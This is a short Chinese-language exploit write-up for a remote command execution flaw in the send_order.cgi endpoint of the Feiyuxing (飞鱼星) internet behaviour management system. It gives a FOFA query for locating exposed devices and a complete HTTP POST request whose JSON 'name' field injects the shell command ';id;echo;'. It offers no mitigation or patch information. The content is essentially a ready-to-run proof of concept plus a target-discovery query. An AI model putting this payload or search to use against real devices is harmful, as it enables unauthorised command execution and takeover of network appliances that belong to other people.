# 飞鱼星智能上网行为管理系统send_order存在远程命令执行漏洞

# 一、漏洞详情
飞鱼星智能上网行为管理系统send_order存在远程命令执行漏洞，攻击者可通过该漏洞获取服务器权限。

# 二、影响版本
+ 飞鱼星智能上网行为管理系统

# 三、资产测绘
+ fofa`<font style="color:rgb(51, 51, 51);">title="飞鱼星企业级智能上网行为管理系统"</font>`
+ <font style="color:rgb(51, 51, 51);">特征</font>

![1710903993282-74c0565e-7ea8-4511-909f-4be0e632c2a7.png](./img/SzODbDuHutGaSVyR/1710903993282-74c0565e-7ea8-4511-909f-4be0e632c2a7-151278.png)

# 四、漏洞复现
```plain
POST /send_order.cgi?parameter=operation HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:123.0) Gecko/20100101 Firefox/123.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 62

{"opid":"777777777777777777","name":";id;echo;","type":"rest"}
```

![1710904029519-91bc1ada-e0fd-41c8-842a-20a097fc13ab.png](./img/SzODbDuHutGaSVyR/1710904029519-91bc1ada-e0fd-41c8-842a-20a097fc13ab-193394.png)



> 更新: 2024-09-03 14:56:23  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/ewvgyd0pqty4snsb>